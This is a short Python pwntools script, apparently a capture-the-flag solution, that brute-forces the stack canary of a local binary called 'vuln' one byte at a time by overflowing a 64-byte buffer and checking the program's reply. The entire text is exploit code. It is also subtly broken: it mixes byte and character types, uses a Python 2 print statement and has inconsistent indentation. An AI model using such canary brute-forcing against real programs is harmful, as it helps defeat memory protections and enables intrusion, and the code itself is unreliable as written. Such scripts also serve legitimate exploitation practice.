from pwn import *
from string import printable

canary = b""
for offset in range(1,5):
    for i in range(256):
    	elf = ELF('./vuln')
        p = elf.process()
        junk = b'0'*64 + canary + chr(i)
        payload = [
            junk,
        ]
        payload = b''.join(payload)
        p.sendline(str(64 + len(canary) + 1))
        p.sendline(payload)
        result = p.recvall().decode(encoding='ascii')
        if "Ok... Now Where's the Flag?" in result:
            canary += chr(i)
            break
print canary

